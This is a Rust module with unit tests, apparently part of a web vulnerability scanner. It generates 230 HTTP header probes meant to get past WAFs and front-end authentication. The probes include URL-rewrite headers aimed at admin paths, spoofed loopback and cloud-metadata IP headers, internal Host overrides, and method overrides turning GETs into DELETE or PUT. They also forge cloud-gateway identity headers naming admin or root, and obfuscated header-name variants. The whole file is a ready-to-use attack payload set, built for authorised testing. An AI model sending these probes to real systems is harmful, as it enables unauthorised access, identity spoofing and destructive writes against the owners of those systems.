//! Auth-bypass header probes (Orange Tsai parser-disagreement class).
//!
//! Many WAFs strip or never forward certain "trust" headers — but the
//! origin application accepts them and uses them for routing or
//! authentication decisions. The classic exploit primitive is:
//!
//! - `X-Original-URL: /admin/secret` — IIS / ASP.NET URL rewriting.
//!   WAF sees `GET /public` and lets it through; backend rewrites to
//!   `/admin/secret` and serves it.
//! - `X-Rewrite-URL: /admin/secret` — same family, different stack.
//! - `X-Forwarded-For: 127.0.0.1` — origin trusts this for IP-based
//!   allowlists ("internal calls only").
//! - `X-Real-IP`, `X-Originating-IP`, `X-Client-IP`, `X-Remote-IP`,
//!   `X-Forwarded-Host` — same family, different headers.
//! - `X-HTTP-Method-Override: PUT` — origin overrides the actual HTTP
//!   method, turning a GET past the WAF into a destructive write.
//!
//! These are not "WAF evasion" in the traditional sense — they exploit
//! the WAF's correct behaviour (passing through unknown headers) plus
//! the backend's incorrect behaviour (trusting them). Together: real
//! pre-auth access on hardened-looking deployments. `ProxyShell`
//! (CVE-2021-34473) and a long tail of Bugcrowd / `HackerOne` reports
//! are in this class.
//!
//! This module emits a list of `(header_name, header_value)` pairs.
//! Each pair is one probe variant; callers attach exactly one per
//! request and observe whether the response status / body changes vs
//! the baseline.

/// One auth-bypass probe to attach to a single request.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct AuthBypassProbe {
    /// Header name to inject.
    pub header: String,
    /// Header value.
    pub value: String,
    /// Short label naming the bypass family (e.g. `x-original-url`,
    /// `forwarded-for-localhost`, `method-override-put`). Useful for
    /// gene-bank attribution.
    pub label: &'static str,
    /// Concise human description suitable for a finding report.
    pub description: &'static str,
}

/// Generate the full set of routing / auth bypass probes for the given
/// target. `target_path` is the protected resource the user is trying
/// to reach (e.g. `/admin/users`, `/internal/api/keys`). For probes
/// that don't take a path it is ignored.
#[must_use]
pub fn auth_bypass_probes(target_path: &str) -> Vec<AuthBypassProbe> {
    let mut out = Vec::new();

    // ── URL-rewrite header family ────────────────────────────────────
    // IIS / ASP.NET / Apache mod_rewrite all honour these in various
    // configs. The WAF doesn't, so it sees the harmless surface URL.
    for header in [
        "X-Original-URL",
        "X-Rewrite-URL",
        "X-Override-URL",
        "X-HTTP-Destination",
        "Original-URL",
        "X-Forwarded-Path",
    ] {
        out.push(AuthBypassProbe {
            header: header.to_string(),
            value: target_path.to_string(),
            label: "url-rewrite-header",
            description: "WAF passes header through; backend rewrites URL to target",
        });
    }

    // ── IP-trust header family ───────────────────────────────────────
    // Many backends gate /admin or /internal on "is the source IP in
    // the loopback / RFC1918 range?" — and read the header instead of
    // the socket peer. Spoof the trusted IP.
    let trusted_ips = [
        "127.0.0.1",
        "::1",
        "localhost",
        "10.0.0.1",
        "192.168.0.1",
        "172.16.0.1",
        "169.254.169.254", // AWS metadata service host
    ];
    let ip_headers = [
        "X-Forwarded-For",
        "X-Real-IP",
        "X-Originating-IP",
        "X-Client-IP",
        "X-Remote-IP",
        "X-Remote-Addr",
        "Forwarded",      // RFC 7239 standard form
        "True-Client-IP", // Akamai / Cloudflare Enterprise
        "CF-Connecting-IP",
        "Fastly-Client-IP",
        "X-Cluster-Client-IP",
        "Client-IP",
    ];
    for h in ip_headers {
        for ip in trusted_ips {
            let value = if h.eq_ignore_ascii_case("Forwarded") {
                // RFC 7239 §4 + §6.3: node-name production requires
                // IPv6 to be bracketed AND quoted (`for="[::1]"`).
                // Bare hostnames like `localhost` are NOT valid as
                // node-names — they must be obfnodes (`_internal`)
                // or the backend (nginx realip, Apache mod_remoteip)
                // rejects the value silently and the probe never
                // reaches the auth path it's meant to test.
                // Audit (2026-05-10).
                if ip.contains(':') && !ip.starts_with('[') {
                    format!(r#"for="[{ip}]""#)
                } else if ip.parse::<std::net::IpAddr>().is_err() {
                    // Non-IP token (e.g. "localhost"): rewrite as
                    // RFC-7239-valid obfnode.
                    let obf: String = ip
                        .chars()
                        .filter(|c| c.is_ascii_alphanumeric() || *c == '_')
                        .collect();
                    format!("for=_{obf}")
                } else {
                    format!("for={ip}")
                }
            } else {
                ip.to_string()
            };
            out.push(AuthBypassProbe {
                header: h.to_string(),
                value,
                label: "ip-trust-spoof",
                description: "Backend trusts header for IP-based authorization",
            });
        }
    }

    // ── Host-trust header family ─────────────────────────────────────
    // Origin uses Host header for vhost routing or for "is this an
    // internal call?". Override with an internal hostname.
    for h in ["X-Forwarded-Host", "X-Host", "X-Forwarded-Server", "Host"] {
        for v in ["localhost", "internal", "admin.internal", "127.0.0.1"] {
            out.push(AuthBypassProbe {
                header: h.to_string(),
                value: v.to_string(),
                label: "host-trust-override",
                description: "Origin uses header for vhost/internal-call routing",
            });
        }
    }

    // ── Method-override family ───────────────────────────────────────
    // Backends accepting these turn a GET past the WAF into a PUT/
    // DELETE/PATCH. Useful when the WAF only inspects state-changing
    // methods.
    for value in ["PUT", "DELETE", "PATCH", "POST", "PROPFIND", "TRACE"] {
        for h in [
            "X-HTTP-Method-Override",
            "X-HTTP-Method",
            "X-Method-Override",
            "_method", // Rails, Symfony default
        ] {
            out.push(AuthBypassProbe {
                header: h.to_string(),
                value: value.to_string(),
                label: "method-override",
                description: "Origin honours header to switch HTTP method (GET → PUT/DELETE)",
            });
        }
    }

    // ── Scheme-trust family ──────────────────────────────────────────
    // Some apps gate features on "did you come in over HTTPS?" by
    // reading X-Forwarded-Proto. If they only enforce auth on HTTP,
    // forcing https here can flip a check.
    for h in ["X-Forwarded-Proto", "X-Forwarded-Scheme", "X-Url-Scheme"] {
        for v in ["http", "https"] {
            out.push(AuthBypassProbe {
                header: h.to_string(),
                value: v.to_string(),
                label: "scheme-trust",
                description: "Origin uses header to decide HTTPS-only enforcement",
            });
        }
    }

    // ── 2026 frontier: gateway-injected-identity family ──────────────
    // Cloud API gateways (Cloudflare Access, AWS API Gateway, Azure
    // Front Door, GCP IAP, Auth0 Authorization Code Flow) inject
    // identity headers AFTER the gateway authenticates the caller.
    // Some backends trust these unconditionally — if the WAF is
    // upstream of the gateway (uncommon but happens in zero-trust
    // chained-proxy setups) or if a misconfigured backend reads them
    // from any caller, spoofing the identity bypasses auth.
    for h in [
        "Cf-Access-Authenticated-User-Email", // Cloudflare Access
        "Cf-Access-Jwt-Assertion",
        "X-Goog-Authenticated-User-Email",    // GCP IAP
        "X-Goog-Iap-Jwt-Assertion",
        "X-Amzn-Oidc-Identity",                // AWS ALB OIDC
        "X-Amzn-Oidc-Data",
        "X-Ms-Client-Principal-Name",          // Azure App Service Easy Auth
        "X-Ms-Client-Principal-Id",
        "X-Ms-Token-Aad-Id-Token",
        "X-Authentik-Username",                // Authentik / open-source proxy
        "X-Authentik-Groups",
        "X-Auth-Request-User",                 // oauth2-proxy default
        "X-Auth-Request-Email",
        "X-Auth-Request-Groups",
        "X-Forwarded-User",                    // Traefik forwardAuth default
        "X-Forwarded-Email",
        "X-Forwarded-Groups",
        "X-Webauth-User",                      // Grafana
    ] {
        for v in [
            "admin",
            "admin@example.com",
            "root",
            "root@localhost",
            "administrator@internal",
        ] {
            out.push(AuthBypassProbe {
                header: h.to_string(),
                value: v.to_string(),
                label: "gateway-identity-spoof",
                description: "Backend trusts gateway-injected identity header without verifying upstream signature",
            });
        }
    }

    // ── 2026 frontier: header-smuggling-via-LWS family ───────────────
    // Single-char obfuscations of a known-trusted header name that
    // some WAFs strip-normalise (case-insensitive byte compare) but
    // backends preserve as a distinct header. If the backend has a
    // case-insensitive lookup AND the WAF normalises tokens via
    // strict case-insensitive ASCII matching only, this slips.
    for variant in [
        " X-Real-IP",       // leading space
        "X-Real-IP\t",      // trailing tab
        "X\u{00ad}Real-IP", // soft hyphen U+00AD inside (some parsers drop)
        "X-Real_IP",        // underscore swap (nginx default DROPS this;
                            // Apache passes it through — divergence
                            // surfaces the misconfiguration).
    ] {
        out.push(AuthBypassProbe {
            header: variant.to_string(),
            value: "127.0.0.1".to_string(),
            label: "header-smuggle-lws",
            description: "Whitespace / case / underscore variant of a trusted header — exploits WAF↔backend normalisation gap",
        });
    }

    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn url_rewrite_family_targets_user_path() {
        let probes = auth_bypass_probes("/admin/users");
        let rewrite = probes
            .iter()
            .filter(|p| p.label == "url-rewrite-header")
            .collect::<Vec<_>>();
        assert!(rewrite.len() >= 6, "missing rewrite-header variants");
        for p in rewrite {
            assert_eq!(
                p.value, "/admin/users",
                "{} did not carry user path",
                p.header
            );
        }
    }

    #[test]
    fn x_original_url_present() {
        let probes = auth_bypass_probes("/admin");
        assert!(
            probes
                .iter()
                .any(|p| p.header == "X-Original-URL" && p.value == "/admin"),
            "missing canonical X-Original-URL probe"
        );
    }

    #[test]
    fn ip_trust_includes_loopback_and_metadata() {
        let probes = auth_bypass_probes("/x");
        let ip = probes
            .iter()
            .filter(|p| p.label == "ip-trust-spoof")
            .collect::<Vec<_>>();
        assert!(ip.iter().any(|p| p.value == "127.0.0.1"));
        assert!(ip.iter().any(|p| p.value == "169.254.169.254"));
        // RFC 7239 Forwarded uses for=<ip> form, not bare IP.
        assert!(
            ip.iter()
                .any(|p| p.header.eq_ignore_ascii_case("Forwarded") && p.value.starts_with("for="))
        );
    }

    #[test]
    fn method_override_offers_destructive_methods() {
        let probes = auth_bypass_probes("/x");
        let methods: Vec<&str> = probes
            .iter()
            .filter(|p| p.label == "method-override")
            .map(|p| p.value.as_str())
            .collect();
        for m in ["PUT", "DELETE", "PATCH"] {
            assert!(methods.contains(&m), "method {m} not in override probes");
        }
    }

    #[test]
    fn forwarded_host_includes_internal() {
        let probes = auth_bypass_probes("/x");
        assert!(
            probes.iter().any(|p| p.header == "X-Forwarded-Host"
                && (p.value == "localhost" || p.value == "internal"))
        );
    }

    #[test]
    fn no_probe_has_empty_header_or_value() {
        for p in auth_bypass_probes("/x") {
            assert!(!p.header.is_empty(), "empty header in probe");
            assert!(!p.value.is_empty(), "empty value in probe: {p:?}");
        }
    }

    #[test]
    fn probes_have_unique_header_value_pairs() {
        let probes = auth_bypass_probes("/admin");
        let mut seen = std::collections::HashSet::new();
        for p in &probes {
            let key = (p.header.to_lowercase(), p.value.clone());
            assert!(
                seen.insert(key.clone()),
                "duplicate (header, value) pair: {key:?}"
            );
        }
    }

    #[test]
    fn total_probe_count_locked() {
        // Lock the count so a future edit doesn't silently drop a probe
        // family. URL-rewrite (6) + IP-trust (12 headers × 7 IPs = 84)
        // + Host-trust (4 × 4 = 16) + Method-override (4 × 6 = 24)
        // + Scheme-trust (3 × 2 = 6) + Gateway-identity (18 × 5 = 90)
        // + Header-smuggle-LWS (4) = 230.
        let probes = auth_bypass_probes("/x");
        assert_eq!(probes.len(), 230, "auth_bypass_probes count drift");
    }
}
